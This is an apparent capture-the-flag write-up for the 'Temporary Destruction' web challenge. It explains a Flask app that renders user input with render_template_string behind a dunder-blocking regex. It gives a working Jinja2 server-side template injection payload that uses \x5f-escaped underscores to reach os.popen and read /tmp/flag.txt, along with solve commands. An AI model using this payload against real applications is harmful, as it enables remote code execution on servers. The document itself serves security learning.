---
title: "Temporary Destruction - CTF@CIT 2026"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "ssti", "jinja2", "render-template", "temporary", "destruction", "ctf-cit", "ctf-cit-2026", "2026", "ctf-writeup"]
summary: "The app directly feeds attacker-controlled input into rendertemplatestring."
source:
  name: "CTFtime writeup #40754"
  url: "https://ctftime.org/writeup/40754"
ctf:
  name: "CTF@CIT 2026"
  year: 2026
  challenge: "Temporary Destruction"
---

## Metadata

- **CTF:** CTF@CIT 2026
- **Task:** Temporary Destruction
- **Author team:** Byte0xb105
- **CTFtime:** <https://ctftime.org/writeup/40754>

---
# Writeup: Temporary Destruction

## TL;DR

The app directly feeds attacker-controlled input into `render_template_string`.  
It tries to block SSTI with a regex for `__word__`, but that blacklist is bypassed with escaped underscores like `\x5f`.  
Using Jinja attribute access plus escaped dunders gives access to `os.popen`, which reads `/tmp/flag.txt`.

## Recon

The provided source bundle in `other/src/temporary-destruction/` contains the whole app.

The core route in `[app.py](http://app.py)` is:

```python  
if request.method == 'POST':  
raw_input = request.form.get('user_input', '')

if BLOCKED.search(raw_input):  
output = 'rejected.'  
is_error = True  
else:  
try:  
output = render_template_string(raw_input)  
except Exception:  
output = 'error.'  
is_error = True  
```

`BLOCKED` only rejects strings matching:

```python  
re.compile(r'__\w+__')  
```

So regular SSTI payloads like `{{ cycler.__init__ }}` are blocked, but Jinja still evaluates escaped string literals.

## Vulnerability

This is server-side template injection.

The app renders user input as a Jinja template and only tries to filter obvious dunder usage.  
That filter is incomplete because Jinja accepts strings such as `"\x5f\x5finit\x5f\x5f"`, which become `__init__` at evaluation time.

## Exploit

Use `cycler.__init__.__globals__` via escaped underscores, then reach `os.popen`:

```jinja2  
{{ ((cycler|attr("\x5f\x5finit\x5f\x5f"))|attr("\x5f\x5fglobals\x5f\x5f"))["os"].popen("cat /tmp/flag.txt").read() }}  
```

That returns the flag file contents.

## Reproduction

The original challenge files are already stored in:

\- `files/temporary-destruction.zip`  
\- `other/src/temporary-destruction/`

Run the organizer app locally:

```bash  
./scripts/[run-local.sh](http://run-local.sh) 5004  
```

That helper recreates the Dockerfile behavior by writing `/tmp/flag.txt` before launching the app.

Solve either local or remote:

```bash  
uv run ./scripts/[solve.py](http://solve.py) http://127.0.0.1:5004  
uv run ./scripts/[solve.py](http://solve.py) http://23.179.17.92:5558  
```

## Flag

`CIT{55T1_R3m0t3_C0d3_3x3cut1on}`
